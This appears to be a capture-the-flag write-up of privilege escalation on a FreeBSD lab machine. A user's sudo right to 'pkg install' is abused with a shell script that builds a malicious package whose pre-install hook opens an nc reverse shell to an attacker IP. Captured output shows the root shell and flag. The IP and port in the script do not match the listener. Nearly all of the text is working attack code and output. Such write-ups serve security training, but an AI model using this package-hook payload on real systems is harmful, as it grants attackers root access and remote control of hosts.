# Enumeration-

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```


### Creating Custom Package for PrivEsc -

[Reference](http://lastsummer.de/creating-custom-packages-on-freebsd/)

Exploit.sh -

```bash
**#!/bin/sh
STAGEDIR=/tmp/package
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
# careful here, this may clobber your system
echo “Resetting root shell”
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.94 4321 >/tmp/a # Replace the IP with your tun0 IP
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo “Registering root shell”
pw usermod -n root -s /bin/sh
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: “1.0_5”
origin: sysutils/mypackage
comment: “automates stuff”
desc: “automates tasks which can also be undone later”
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .**
```

Run it -

```bash
jamie@Schooled:~ $ ./exploit.sh 
jamie@Schooled:~ $ ls
exploit.sh                      mypackage-“1.0_5”.txz           user.txt
jamie@Schooled:~ $ sudo pkg install --no-repo-update *.txz
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        mypackage: “1.0_5”

Number of packages to be installed: 1

Proceed with this action? [y/N]: y
[1/1] Installing mypackage-“1.0_5”...
“Resetting root shell”
rm: /tmp/a: No such file or directory
```

### Root Shell-

```bash
root@napster:~/Documents/HTB/Schooled# nc -nvlp 9080
listening on [any] 9080 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.234] 44830
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
# ls
.cshrc
.history
.login
.login_conf
.mail_aliases
.mailrc
.profile
.shrc
exploit.sh
mypackage-“1.0_5”.txz
user.txt
# cd /root
# cat root.txt
0b02bf11ba85cda8aefc7badd4973d8f
```